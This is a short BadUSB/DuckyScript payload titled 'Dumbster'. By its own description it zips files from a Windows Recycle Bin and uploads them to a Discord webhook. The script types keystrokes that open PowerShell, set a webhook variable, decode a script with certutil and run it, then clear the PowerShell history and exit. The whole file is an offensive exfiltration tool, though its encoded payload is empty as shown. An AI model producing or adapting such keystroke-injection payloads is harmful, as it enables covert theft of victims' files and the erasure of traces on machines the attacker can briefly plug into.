REM Title      : Dumbster
REM Description: Zips files from Recycle Bin and uploads zips to Discord via webhook.
REM Author     : dag
REM Version    : 0.0.5
REM Generated by REDD's Encrypted Payload Generator
REM - It is highly suggested you adjust the DELAYS for your use.
DELAY 2000
GUI r
DELAY 200
STRING powershell
DELAY 500
ENTER
DELAY 5000
STRING $webhook = "DiscordWebhook";
DELAY 5000
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo  > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
STRING Clear-History
ENTER
STRING exit
ENTER
